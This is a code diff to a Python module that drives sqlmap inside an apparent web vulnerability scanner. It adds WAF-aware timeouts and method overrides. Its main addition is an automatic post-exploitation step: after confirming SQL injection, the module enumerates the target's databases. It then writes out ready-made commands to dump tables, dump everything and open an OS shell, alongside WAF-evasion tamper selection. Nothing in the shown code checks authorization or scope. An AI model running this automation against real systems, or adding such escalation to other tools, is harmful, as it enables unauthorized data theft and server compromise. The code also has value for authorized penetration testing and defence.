@@ -56,6 +56,12 @@ _RANDOM_UA_POOL = [
 ]
 
 
+def _extract_dbms(text: str) -> Optional[str]:
+    """Extract DBMS string from sqlmap output."""
+    m = _RE_DBMS.search(text)
+    return m.group(1).strip() if m else None
+
+
 def _pick_tampers(waf_name: str) -> List[str]:
     waf_lower = (waf_name or "").lower()
     for key, tampers in _WAF_TAMPERS.items():
@@ -189,18 +195,22 @@ class SqlmapRunner:
         param: Optional[str] = None,
         waf_name: str = "",
         dbms: Optional[str] = None,
+        override_method: str = "",
+        override_data: str = "",
     ) -> List[Finding]:
         from . import is_available
         if not is_available("sqlmap"):
             logger.warning("[sqlmap] not found on PATH — skipping.")
             return []
 
-        method   = self.config.get("method", "GET").upper()
-        data     = self.config.get("data") or ""
+        method   = (override_method or self.config.get("method", "GET")).upper()
+        data     = override_data or self.config.get("data") or ""
         cookies_d = self.config.get("cookies") or {}
         cookies_s = "; ".join(f"{k}={v}" for k, v in cookies_d.items())
         proxy    = self.config.get("proxy")
-        timeout  = max(30, self.config.get("timeout", 10) * 3)
+        # Timeout: 10 min for WAF targets, 5 min otherwise; always ≥ 60s
+        hard_cap = 600 if waf_name else 300
+        timeout  = max(60, self.config.get("timeout", 10) * 6)
         waf_ev   = self.config.get("waf_evasion", 0)
         headers  = {k: v for k, v in (self.config.get("headers") or {}).items()
                     if k.lower() != "user-agent"}
@@ -219,10 +229,15 @@ class SqlmapRunner:
                     cmd,
                     capture_output=True,
                     text=True,
-                    timeout=300,  # 5 min hard cap
+                    timeout=hard_cap,
                 )
             except subprocess.TimeoutExpired:
-                logger.warning("[sqlmap] timed out after 5 minutes.")
+                logger.warning("[sqlmap] timed out after %ds.", hard_cap)
+                logger.info(
+                    "[sqlmap] tip: run manually with shorter technique set: "
+                    "sqlmap -u '%s' --batch --technique BT --level 1 --dbs",
+                    url,
+                )
                 return []
             except FileNotFoundError:
                 logger.warning("[sqlmap] binary not found.")
@@ -236,8 +251,81 @@ class SqlmapRunner:
                 return []
 
             findings = _parse_output(output, url)
-            if findings:
-                logger.info("[sqlmap] %d injection(s) confirmed.", len(findings))
-            else:
+            if not findings:
                 logger.info("[sqlmap] no injections found.")
+                return []
+
+            logger.info("[sqlmap] %d injection(s) confirmed.", len(findings))
+
+            # Post-exploitation: auto-enumerate databases when injection is confirmed.
+            post_findings = self._run_post_exploitation(
+                url=url, param=param, method=method, data=data,
+                waf_name=waf_name, waf_evasion=waf_ev,
+                dbms=dbms or _extract_dbms(output),
+                cookies=cookies_s, proxy=proxy,
+                extra_headers=headers, out_dir=out_dir,
+                timeout=timeout, delay=delay,
+            )
+            findings.extend(post_findings)
             return findings
+
+    def _run_post_exploitation(
+        self, url: str, param: Optional[str], method: str, data: str,
+        waf_name: str, waf_evasion: int, dbms: Optional[str],
+        cookies: str, proxy: Optional[str], extra_headers: Dict,
+        out_dir: str, timeout: int, delay: float,
+    ) -> List[Finding]:
+        """Run --dbs after confirming injection, then build a rich Finding."""
+        dbs_cmd = _build_command(
+            url=url, param=param, method=method, data=data,
+            waf_name=waf_name, waf_evasion=waf_evasion, dbms=dbms,
+            cookies=cookies, proxy=proxy, output_dir=out_dir,
+            extra_headers=extra_headers, timeout=timeout, delay=delay,
+        ) + ["--dbs"]
+        logger.info("[sqlmap] post-exploitation: enumerating databases...")
+        try:
+            proc = subprocess.run(
+                dbs_cmd, capture_output=True, text=True, timeout=min(timeout * 2, 300),
+            )
+        except Exception as exc:
+            logger.debug("[sqlmap] --dbs failed: %s", exc)
+            return []
+
+        output = proc.stdout + proc.stderr
+        dbs = _RE_DB_LIST.findall(output)
+        if not dbs:
+            return []
+
+        dbms_detected = _extract_dbms(output) or dbms or "unknown"
+        p = param or "param"
+        data_flag = f" --data '{data}'" if data else ""
+        dbms_flag = f" --dbms {dbms_detected.split()[0]}" if dbms_detected != "unknown" else ""
+        base_cmd = f"sqlmap -u '{url}' -p {p}{data_flag}{dbms_flag} --batch"
+
+        details = (
+            f"sqlmap enumerated {len(dbs)} database(s) on the target:\n"
+            + "  ".join(dbs)
+            + f"\nBack-end DBMS: {dbms_detected}"
+        )
+        repro = (
+            f"# Databases found: {', '.join(dbs)}\n"
+            f"# Dump tables from a specific database:\n"
+            f"$ {base_cmd} -D {dbs[0]} --tables\n"
+            f"# Dump data from a table:\n"
+            f"$ {base_cmd} -D {dbs[0]} -T <TABLE> --dump\n"
+            f"# Dump all data (careful — slow):\n"
+            f"$ {base_cmd} -D {dbs[0]} --dump-all\n"
+            f"# Try OS shell if stacked queries are supported:\n"
+            f"$ {base_cmd} --os-shell"
+        )
+        return [Finding(
+            vuln_type="SQL Injection — DB Enumeration [sqlmap]",
+            url=url,
+            method=method,
+            parameter=p,
+            payload="--dbs",
+            evidence=f"Databases: {', '.join(dbs)}",
+            confidence="high",
+            details=details,
+            reproduction=repro,
+        )]
